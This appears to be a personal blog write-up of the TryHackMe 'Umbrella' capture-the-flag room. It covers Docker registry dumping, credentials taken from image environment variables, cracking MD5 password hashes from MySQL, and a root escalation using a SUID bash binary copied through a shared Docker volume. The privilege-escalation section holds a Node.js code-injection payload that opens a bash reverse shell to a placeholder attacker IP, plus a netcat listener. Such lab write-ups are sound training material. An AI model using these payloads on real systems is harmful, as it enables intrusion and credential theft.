---
layout: post
title: Umbrella writeup (TryHackMe)
author: wizarddos
category: writeups
excerpt_separator: <!--more-->
---

From what I've read in description - it's based around some misconfigurations and docker

I can spoil you this - privesc is interesting

This challange is from [TryHackMe](https://tryhackme.com/room/umbrella)

<!--more-->

### Port scanning

As always - first is nmap scan
```
$ nmap -sC -sV -oN scan.txt $IP
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-20 15:23 CET
Nmap scan report for 10.10.241.83
Host is up (0.043s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 f0:14:2f:d6:f6:76:8c:58:9a:8e:84:6a:b1:fb:b9:9f (RSA)
|   256 8a:52:f1:d6:ea:6d:18:b2:6f:26:ca:89:87:c9:49:6d (ECDSA)
|_  256 4b:0d:62:2a:79:5c:a0:7b:c4:f4:6c:76:3c:22:7f:f9 (ED25519)
3306/tcp open  mysql   MySQL 5.7.40
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.40
|   Thread ID: 5
|   Capabilities flags: 65535
|   Some Capabilities: SwitchToSSLAfterHandshake, FoundRows, LongColumnFlag, Support41Auth, Speaks41ProtocolOld, SupportsTransactions, LongPassword, IgnoreSpaceBeforeParenthesis, IgnoreSigpipes, InteractiveClient, Speaks41ProtocolNew, SupportsLoadDataLocal, ODBCClient, SupportsCompression, DontAllowDatabaseTableColumn, ConnectWithDatabase, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: g(C\x1Fz}q\x0ErS\x06R
| w7*)~(\x1F
|_  Auth Plugin Name: mysql_native_password
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=MySQL_Server_5.7.40_Auto_Generated_Server_Certificate
| Not valid before: 2022-12-22T10:04:49
|_Not valid after:  2032-12-19T10:04:49
5000/tcp open  http    Docker Registry (API: 2.0)
|_http-title: Site doesn't have a title.
8080/tcp open  http    Node.js (Express middleware)
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Okay, we have
- `SSH`
- `MySQL`
- `Docker`
- `Node.js`

As for the website - we have login page
But there is `Docker Registry`

### Docker registry enumeration

We'll use tool called [DockerRegistryGrabber](https://github.com/Syzik/DockerRegistryGrabber)

Go to cloned catalogue and let's start with listing available images
```
$ python drg.py http://$IP --list
[+] umbrella/timetracking
```

There is one image - maybe there is something inside. 

We should dump it
```
$ python drg.py http://$IP --dump umbrella/timetracking
[+] BlobSum found 23
[+] Dumping umbrella/timetracking
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : c9124d8ccff258cf42f1598eae732c3f530bf4cdfbd7c4cd7b235dfae2e0a549
    [+] Downloading : 62c454461c50ff8fb0d1c5d5ad8146203bb4505b30b9c27e6f05461b6d07edcb
    [+] Downloading : 82f3f98b46d4129f725cab6326d0521589d5b75ae0a480256495d216b2cd9216
    [+] Downloading : e5e56a29478cdf60132aa574648135a89299151414b465942a569f2109eefa65
    [+] Downloading : 7fbf137cf91ff826f2b2fddf3a30ea2e3d2e62d17525b708fd76db392e58df62
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : 15b79dac86ef36668f382565f91d1667f7a6fc876a3b58b508b6778d8ed71c0e
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : 23e2f216e8246d20ed3271ad109cec07f2a00b17bef8529708d8ae86100c7e03
    [+] Downloading : f897be510228b2f804fc2cb5d04cddae2e5689cbede553fb2d587c54be0ba762
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : a3241ece5841b2e29213eb450a1b29385bf9e0063c37978253c98ff517e6e1b3
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : 00fde01815c92cc90586fcf531723ab210577a0f1cb1600f08d9f8e12c18f108
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : 3f4ca61aafcd4fc07267a105067db35c0f0ac630e1970f3cd0c7bf552780e985

```

There is a bit of it -

using this command:
```sh
for i in *.tar.gz; do tar -xzvf $i; done
```

I've unpacked and added everything into one folder

Here are most interesting parts

1. `/etc/shadow` of docker container
```
root:*:19345:0:99999:7:::
daemon:*:19345:0:99999:7:::
bin:*:19345:0:99999:7:::
sys:*:19345:0:99999:7:::
sync:*:19345:0:99999:7:::
games:*:19345:0:99999:7:::
man:*:19345:0:99999:7:::
lp:*:19345:0:99999:7:::
mail:*:19345:0:99999:7:::
news:*:19345:0:99999:7:::
uucp:*:19345:0:99999:7:::
proxy:*:19345:0:99999:7:::
www-data:*:19345:0:99999:7:::
backup:*:19345:0:99999:7:::
list:*:19345:0:99999:7:::
irc:*:19345:0:99999:7:::
gnats:*:19345:0:99999:7:::
nobody:*:19345:0:99999:7:::
_apt:*:19345:0:99999:7:::
node:!:19347:0:99999:7:::
```

In one of those compressed archives - we have whole application logic - let's see the `auth` part
```js
// http://localhost:8080/auth
app.post('/auth', function(request, response) {
	
	let username = request.body.username;
	let password = request.body.password;	
	
	if (username && password) {
		
		let hash = crypto.createHash('md5').update(password).digest("hex");
		
		connection.query('SELECT * FROM users WHERE user = ? AND pass = ?', [username, hash], function(error, results, fields) {
			
			if (error) {
				log(error, "error")
			};
			
			if (results.length > 0) {
				
				request.session.loggedin = true;
				request.session.username = username;		
				log(`User ${username} logged in`, "info");	
				response.redirect('/');	
			} else {
				log(`User ${username} tried to log in with pass ${password}`, "warn")
				response.redirect('/');	
			} 					
		});		
	} else {
		response.redirect('/');	
	} 	

});
```

First of all - passwords are hashed in `md5` - If we access them, we can easily crack them
Second of all - every successfull and unsuccessfull try is loged into log file

`log` function looks like this
```js
var logfile = fs.createWriteStream(process.env.LOG_FILE, {flags: 'a'});

var log = (message, level) => {
	format_message = `[${level.toUpperCase()}] ${message}`;
	logfile.write(format_message + "\n")
	if (level == "warn") console.warn(message)
	else if (level == "error") console.error(message)
	else if (level == "info") console.info(message)
	else console.log(message)
}
```

Sadly it's name is only in enviromental variables - so we can't really access it directly

But, let's get the docker image
```
$ sudo docker pull $IP:5000/umbrella/timetracking:latest
```

Then, after checking history we see
```
$ sudo docker history  $IP:5000/umbrella/timetracking:latest
IMAGE          CREATED         CREATED BY                                      SIZE      COMMENT
7843f102a2fc   13 months ago   /bin/sh -c #(nop)  CMD ["node" "app.js"]        0B        
<missing>      13 months ago   /bin/sh -c #(nop)  EXPOSE 8080                  0B        
<missing>      13 months ago   /bin/sh -c #(nop) COPY file:15724d44e98203ba…   3.24kB    
<missing>      13 months ago   /bin/sh -c #(nop) COPY dir:f4893f0d1db8ba309…   1.87kB    
<missing>      13 months ago   /bin/sh -c #(nop) COPY dir:b1f43f22176dce6e1…   2.56kB    
<missing>      13 months ago   /bin/sh -c npm install                          8.15MB    
<missing>      13 months ago   /bin/sh -c #(nop) COPY multi:8ea3cb977bb32fa…   64.3kB    
<missing>      13 months ago   /bin/sh -c #(nop)  ENV LOG_FILE=/logs/tt.log    0B        
<missing>      13 months ago   /bin/sh -c #(nop)  ENV DB_DATABASE=timetrack…   0B        
<missing>      13 months ago   /bin/sh -c #(nop)  ENV DB_PASS=Ng1-f3!Pe7-e5…   0B        
<missing>      13 months ago   /bin/sh -c #(nop)  ENV DB_USER=root             0B        
<missing>      13 months ago   /bin/sh -c #(nop)  ENV DB_HOST=db               0B        
<missing>      13 months ago   /bin/sh -c #(nop) WORKDIR /usr/src/app          0B        
<missing>      13 months ago   /bin/sh -c #(nop)  CMD ["node"]                 0B        
<missing>      13 months ago   /bin/sh -c #(nop)  ENTRYPOINT ["docker-entry…   0B        
<missing>      13 months ago   /bin/sh -c #(nop) COPY file:4d192565a7220e13…   388B      
<missing>      13 months ago   /bin/sh -c set -ex   && savedAptMark="$(apt-…   9.49MB    
<missing>      13 months ago   /bin/sh -c #(nop)  ENV YARN_VERSION=1.22.19     0B        
<missing>      13 months ago   /bin/sh -c ARCH= && dpkgArch="$(dpkg --print…   157MB     
<missing>      13 months ago   /bin/sh -c #(nop)  ENV NODE_VERSION=19.3.0      0B        
<missing>      13 months ago   /bin/sh -c groupadd --gid 1000 node   && use…   333kB     
<missing>      13 months ago   /bin/sh -c #(nop)  CMD ["bash"]                 0B        
<missing>      13 months ago   /bin/sh -c #(nop) ADD file:73e68ae6852c9afbb…   80.5MB
```
As we see it's all stored in enviromental variables


Then, we can start shell check `env`
```
$ sudo docker run -it $IP:5000/umbrella/timetracking:latest bash
# env
HOSTNAME=a94df8ac7d25
YARN_VERSION=1.22.19
PWD=/home/node
DB_USER=root
HOME=/root
LOG_FILE=/logs/tt.log
TERM=xterm
DB_HOST=db
SHLVL=1
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
NODE_VERSION=19.3.0
DB_DATABASE=timetracking
DB_PASS=[REDACTED]
_=/usr/bin/env
OLDPWD=/root
```

That's how we have DB password - I couldn't break out of docker, so let's check MySQL

```
$ mysql -u root -h $IP -p
```

After inputting password - we get mysql shell

Let's see databases
```
MySQL [(none)]> SHOW databases
    -> ;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| timetracking       |
+--------------------+
5 rows in set (0,050 sec)
```

Nothing that we don't know - let's see the `timetracking` database

```
MySQL [(none)]> USE timetracking;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [timetracking]> SHOW tables;
+------------------------+
| Tables_in_timetracking |
+------------------------+
| users                  |
+------------------------+
1 row in set (0,042 sec)
	
```

There is one table - maybe it has something in it?
```
MySQL [timetracking]> SELECT * FROM users
    -> ;
+----------+----------------------------------+-------+
| user     | pass                             | time  |
+----------+----------------------------------+-------+
| claire-r | 2ac9cb7dc02b3c0083eb70898e549b63 |   360 |
| chris-r  | 0d107d09f5bbe40cade3de5c71e9e9b7 |   420 |
| jill-v   | d5c0607301ad5d5c1528962a83992ac8 |   564 |
| barry-b  | 4a04890400b5d7bac101baace5d7e994 | 47893 |
+----------+----------------------------------+-------+
4 rows in set (0,042 sec)
```

Oh, a bit of names - do you remember that code? It said that passwords are stored in `md5` - let's move them to `hashes.txt` file and try to crack them

It looks like this
```
claire-r:2ac9cb7dc02b3c0083eb70898e549b63 
chris-r:0d107d09f5bbe40cade3de5c71e9e9b7
jill-v:d5c0607301ad5d5c1528962a83992ac8
barry-b:4a04890400b5d7bac101baace5d7e994
```

Now, crack it
```
$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt --format=Raw-md5
Using default input encoding: UTF-8
Loaded 3 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
Press 'q' or Ctrl-C to abort, almost any other key for status
[REDACTED]       (claire-r)	
[REDACTED]       (chris-r)     
[REDACTED]       (jill-v)     
[REDACTED]       (barry-b)     
3g 0:00:00:00 DONE (2024-01-20 20:22) 150.0g/s 441600p/s 441600c/s 518400C/s allstars..glorioso
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

With `claire-r` - we can log into ssh

Get user flag

```
$ ssh claire-r@$IP
[...]
$ cat user.txt
[REDACTED]
```

### Privilege escalation

Inside `~/timeTracker-src` there is logs directory

When we log into the webiste with one of that credentials - we can spawn reverse shell

Start listener
```
$ nc -lvnp [PORT]
```
Replace `[PORT]` with some normal port (like 1337 or whatever)
To do it - I intercepted request in burp and replaced `time` parameter with this payload

```js
require('child_process').exec('bash+-c+"bash+-i+>%26+/dev/tcp/[YOUR IP]/[PORT]+0>%261"')
```

Of course replace `[YOUR IP]` and `[PORT]` with your actual  IP and port you set in netcat


Then, we send the request and we have shell
Now in reverse shell - go to `/logs`
```
# cd /logs
```

There is that log file - but wait 

If we create file inside that directory - we can then access it from ssh

So, when I created `hello.txt` 
```
# touch hello.txt
# echo "Hi" >> hello.txt
```

Then, in SSH I can read it and it was created as a root!
```
$ cd ~/timeTracker-src/logs
$ ls -la
total 16
drwxrw-rw- 2 claire-r claire-r 4096 Jan 20 21:43 .
drwxrwxr-x 6 claire-r claire-r 4096 Jan 20 21:31 ..
-rw-r--r-- 1 root     root        3 Jan 20 21:43 hello.txt
-rw-r--r-- 1 root     root      441 Jan 20 21:39 tt.log

```

There is an interesting way of doing this privesc

From docker reverse shell:
1. copy `ss` binary with `/bin/bash` content into `logs` dir 
```
# cp /bin/bash ss
```
2. Set it's permissions to SUID
```
# chmod u+sx ss
```

Now switch to `claire-r` SSH 
3. run this binary as privileged user
```
$ ss -p
#
```

Now, we can get root flag
```
# cat /root/root.txt
[REDACTED]
```

And that's it - machine pwned

## Conclusion

To be fair - this was rather medium/hard difficulty than easy/medium

While I managed to get to user flag by myself - I had to look for help with root flag

And it took me approximately 1,5-2h to install docker properly on my kali linux 

I learned something new about privilege escalation, contenerizing. Found out about Docker Registry and tools to enumerate it
And exploited (For the first time I think) - NodeJs

Share your feedback in comments - I'll read them all

That's it - check out my other articles and see you next time
